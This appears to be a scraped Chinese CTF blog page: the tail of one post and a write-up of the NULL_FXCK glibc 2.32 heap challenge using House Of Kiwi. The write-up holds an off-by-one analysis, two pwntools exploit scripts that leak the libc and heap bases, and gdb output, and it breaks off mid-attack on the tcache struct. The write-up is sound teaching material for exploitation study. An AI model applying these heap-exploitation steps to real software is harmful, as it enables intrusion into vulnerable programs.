-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x7fc236047020</span> &lt;getkeyserv_handle+<span class="number">528</span>&gt;    mov    rdx, qword ptr [rdi + <span class="number">8</span>]</span><br><span class="line">  <span class="number">0x7fc236047024</span> &lt;getkeyserv_handle+<span class="number">532</span>&gt;    mov    qword ptr [rsp], rax</span><br><span class="line">► <span class="number">0x7fc236047028</span> &lt;getkeyserv_handle+<span class="number">536</span>&gt;    call   qword ptr [rdx + <span class="number">0x20</span>]        &lt;setcontext+<span class="number">61</span>&gt;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>我们可以把 <code>__cookie+0x20</code> 处布置为 <code>setcontext+61</code>：（因为 [RDX] 是可控的）</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RAX  <span class="number">0x7fc236047020</span> (getkeyserv_handle+<span class="number">528</span>) ◂— mov    rdx, qword ptr [rdi + <span class="number">8</span>]</span><br><span class="line">RBX  <span class="number">0x562b7f47b2a0</span> ◂— <span class="number">0x2010</span></span><br><span class="line">RCX  <span class="number">0x0</span></span><br><span class="line">RDX  <span class="number">0x562b7f47baf0</span> ◂— <span class="number">0x0</span></span><br><span class="line">RDI  <span class="number">0x562b7f47baf0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>最后利用 House Of Kiwi 中的方式 get shell</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/06/House%20Of%20Kiwi-2.32-64/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/08/06/House%20Of%20Kiwi-2.32-64/" class="post-title-link" itemprop="url">House Of Kiwi-2.32-64</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-08-06 13:16:35" itemprop="dateCreated datePublished" datetime="2022-08-06T13:16:35+08:00">2022-08-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-08-08 14:43:22" itemprop="dateModified" datetime="2022-08-08T14:43:22+08:00">2022-08-08</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>11k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>10 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>NULL_FXCK 复现</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.32</span><span class="number">-0u</span>buntu3)</span> release release version 2.32</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">main: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">1463577</span>d47e320d9b46df83575b5778e3368f79f, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
-<ul>
-<li>64位，dynamically，全开</li>
-</ul>
-<p>开了沙盒：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
-<ul>
-<li>只能用 ORW</li>
-</ul>
-<p><strong>漏洞分析</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 idx; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 index; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE *chunk; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+Eh] [rbp-2Ah] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  edit_key = <span class="number">0LL</span>;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Index: &quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xA</span>uLL);</span><br><span class="line">  idx = strtol(buf, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !chunk_list[idx] || (index = idx, idx &gt; <span class="number">0x1F</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Error Index ):\n&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Content: &quot;</span>, <span class="number">9uLL</span>);</span><br><span class="line">  chunk = (_BYTE *)chunk_list[index];</span><br><span class="line">  chunk[read(<span class="number">0</span>, chunk, size_list[index])] = <span class="number">0</span>;  <span class="comment">// off-by-one</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>有一个 off-by-one</li>
-</ul>
-<p><strong>入侵思路</strong></p>
-<p>这次尝试使用 House Of Kiwi 来解题，首先要使用这个 off-by-one 来进行 leak，但 libc-2.29 版本以后增加了一些检查：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>需要 last chunk-&gt;size == victim chunk-&gt;presize</li>
-</ul>
-<p>unlink 中也有一些检查：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure>
-<ul>
-<li>需要 victim chunk-&gt;size == next chunk-&gt;presize</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure>
-<ul>
-<li>fd-&gt;bk == p：chunkP 的下一个 chunk 的上一个 chunk 是不是 chunkP</li>
-<li>bk-&gt;fd == p：chunkP 的上一个 chunk 的下一个 chunk 是不是 chunkP</li>
-</ul>
-<p>由于没法 leak heap_base，就要通过以下的办法进行绕过：</p>
-<ul>
-<li>使用 large chunk 遗留的 fd_nextsize 和 bk_nextsize 指针<ul>
-<li>以 fd_nextsize 为 fake_chunk 的 fd</li>
-<li>以 bk_nextsize 为 fake_chunk 的 bk</li>
-</ul>
-</li>
-<li>也可以使用 unsorted chunk 或者 large chunk 的 FD BK 指针，就是对堆风水的要求比较高</li>
-</ul>
-<p><strong>heap 风水的构建</strong></p>
-<p>我自己弄的时候一头雾水，忙活了一个下午也没有搞出来，晚上参考了几个 wp，这里我说下思路：</p>
-<p>思路一：</p>
-<ul>
-<li>合并两个 unsortedbin，在 <code>0x000</code> 处留下如下的 heap 结构</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5639c214c000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5639c214c000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5639c214c008</span> ◂— <span class="number">0x501</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x5639c214c010</span> —▸ <span class="number">0x5639c214ca00</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x5639c214c018</span> —▸ <span class="number">0x5639c214d400</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>利用 unsortedbin 遗留下来的 FD BK 指针进行操作，往 <code>0xa00-&gt;bk</code> 和 <code>0x400-&gt;fd</code> 中写入 <code>0x030</code>，然后利用程序的末尾置空把 <code>0x030</code> 改为 <code>0x000</code></li>
-<li>修改 <code>0x000-&gt;size=0xa00</code>，修改 <code>0xa00-&gt;pre_size=0xa00</code></li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x148</span>) <span class="comment">#0   </span></span><br><span class="line">add(<span class="number">0x4f8</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x1f8</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f8</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x4f8</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4f8</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x4f8</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f8</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x4f8</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x4f8</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x4f8</span>) <span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>) <span class="comment"># key-0xa00</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x528</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa00</span>))<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x4c0</span>) <span class="comment">#4 padding</span></span><br><span class="line">add(<span class="number">0x4f0</span>) <span class="comment">#6 0x400</span></span><br><span class="line">add(<span class="number">0x4f0</span>) <span class="comment">#8 key-0xa00</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>) <span class="comment">#4 0x030 - over \x00 to bk/fd</span></span><br><span class="line">add(<span class="number">0x4c8</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>) <span class="comment"># key-0xa00 - bk=0x030</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># 0x030</span></span><br><span class="line">free(<span class="number">6</span>) <span class="comment"># 0x400 - fd=0x030</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>+<span class="string">&quot;\x00&quot;</span>)<span class="comment">#4 修复fd-&gt;bk(低位覆盖\x00)</span></span><br><span class="line">add(<span class="number">0x4f0</span>) <span class="comment">#6 padding-0x030</span></span><br><span class="line">add(<span class="number">0x4f0</span>) <span class="comment">#8 padding</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>) <span class="comment"># 0x030</span></span><br><span class="line">free(<span class="number">8</span>) <span class="comment"># 0x400 - fd=0x030</span></span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># 0xf00</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x520</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x501</span>)+<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#6 修复bk-&gt;fd(低位覆盖\x00)</span></span><br><span class="line">add(<span class="number">0x4c8</span>) <span class="comment">#8 padding</span></span><br><span class="line">add(<span class="number">0x4f0</span>) <span class="comment">#7 padding</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">0x4c0</span>+p64(<span class="number">0xa00</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># unlink</span></span><br><span class="line">add(<span class="number">0x520</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x1000</span>) </span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1e4160</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
-<p>思路二：</p>
-<ul>
-<li>合并两个 unsortedbin，在 <code>0xd00</code> 处留下如下的 heap 结构</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55f18f2d1d00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55f18f2d1d00</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55f18f2d1d08</span> ◂— <span class="number">0xc91</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55f18f2d1d10</span> —▸ <span class="number">0x55f18f2d12b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55f18f2d1d18</span> —▸ <span class="number">0x55f18f2d2350</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>利用 unsortedbin 遗留下来的 FD BK 指针进行操作，往 <code>0x2b0-&gt;bk</code> 和 <code>0x350-&gt;fd</code> 中写入 <code>0xd20</code>，然后利用程序的末尾置空把 <code>0xd20</code> 改为 <code>0xd00</code></li>
-<li>申请一个大 chunk 使 <code>0x350</code> 进入 largebin，这里主要是为了改变 chunk 的取出方式（largebin 从大到小进行组织-插头取头，unsortedbin FIFO-插头取尾）</li>
-<li>修改 <code>0xd00-&gt;size=0xc91</code>，修改 <code>0x990-&gt;pre_size=0xc90</code></li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x418</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x1f8</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x438</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>,<span class="number">0x428</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xc91</span>)) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3 0x2b0</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#2 0xd20 - over \x00 to bk/fd</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5 0x370</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># 0x2b0 - bk=0xd20</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># 0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">&quot;\x00&quot;</span>) <span class="comment">#2 修复fd-&gt;bk(低位覆盖\x00)</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># 0xd20</span></span><br><span class="line">free(<span class="number">5</span>) <span class="comment"># 0x350 - fd=0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x9f8</span>) <span class="comment">#3 make 0x350 to large </span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#5 修复bk-&gt;fd(低位覆盖\x00)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x200</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xc90</span>))</span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># unlink</span></span><br><span class="line">add(<span class="number">0x430</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,p64(<span class="number">0x421</span>))) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x1600</span>) <span class="comment">#9</span></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">libcbase=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1e4230</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x2b0</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_base: &#x27;</span>+<span class="built_in">hex</span>(heap))</span><br></pre></td></tr></table></figure>
-<ul>
-<li>PS：可能需要一些爆破来得到远程 TLS 的偏移</li>
-<li>参考这位大佬的博客：<a target="_blank" rel="noopener" href="https://blog.wjhwjhn.com/archives/593/">通过LIBC基址来爆破TLS</a> </li>
-</ul>
-<p>两个思路最核心的地方就是：</p>
-<ul>
-<li>获取两个 unsorted chunk 进行合并，其中的第二个 chunk 末地址必须为 <code>\x00</code>（遗留下 FD BK 指针）</li>
-<li>重新申请大 unsorted chunk 后释放（不破坏原来的 heap 结构），然后再次进行分割，使第二个 chunk 的末尾地址为 <code>\x30</code> 或者 <code>\x40</code> <code>\x50</code> 等等（有一定偏移的地址都可以）</li>
-<li>之后利用 unsortedbin 进行调整，在 FD-&gt;bk 和 BK-&gt;fd 中写入 <code>\x30</code>，然后覆盖为 <code>\x00</code></li>
-</ul>
-<p>因为 [思路二] 可以泄露 heap_base，这里选择 [思路二]</p>
-<p><strong>通过 TLS 劫持 tcache struct 以实现三次 WAA</strong></p>
-<p>House Of Kiwi 需要三次 WAA，用常规的 WAA 不能到达目的，只能劫持 main_arena</p>
-<p>malloc_init 会在 heap 段开设一个内存用于管理 tcache（第一个 chunk，tcache struct），而 tcache struct 的地址，可以从 heapbase 被我们劫持到另一个地方：</p>
-<ul>
-<li>tcache struct 的地址被记录在 TLS 段中，只要修改这里就可以劫持 tcache struct</li>
-<li>通过以下方法可以找到 TLS 段的位置：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;main_arena</span><br><span class="line">$<span class="number">2</span> = (struct malloc_state *) <span class="number">0x7fddd4bf7ba0</span> &lt;main_arena&gt;</span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x7fddd4bf7ba0</span></span><br><span class="line">[anon_7fddd4a11] <span class="number">0x7fddd4a11708</span> <span class="number">0x7fddd4bf7ba0</span></span><br><span class="line">libc<span class="number">-2.32</span>.so    <span class="number">0x7fddd4bf8410</span> <span class="number">0x7fddd4bf7ba0</span></span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7ffd6e22af50</span> <span class="number">0x7fddd4bf7ba0</span></span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7ffd6e22afd0</span> <span class="number">0x7fddd4bf7ba0</span></span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7ffd6e22b090</span> <span class="number">0x7fddd4bf7ba0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7fddd4a11708</span><span class="number">-0x20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fddd4a116e8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7fddd4a116f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7fddd4a116f8</span> —▸ <span class="number">0x563469070010</span> ◂— <span class="number">0x0</span> <span class="comment">/* target */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7fddd4a11700</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7fddd4a11708</span> —▸ <span class="number">0x7fddd4bf7ba0</span> (main_arena) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
-<p>接下来就通过 largebin attack 来修改 <code>0x7fddd4a116f8</code> 处存储的 tcache struct addr：</p>
-<ul>
-<li>由于前面已经实现了 heap overlapping，存在一个大 chunk，其中包含了一个小 chunk，两者都可以被控制</li>
-<li>于是我们先释放小 chunk，再释放大 chunk</li>
-<li>接下来申请大 chunk，在小 chunk 中完成 large attack 的布局</li>
-</ul>
-<p>进行攻击前：</p>
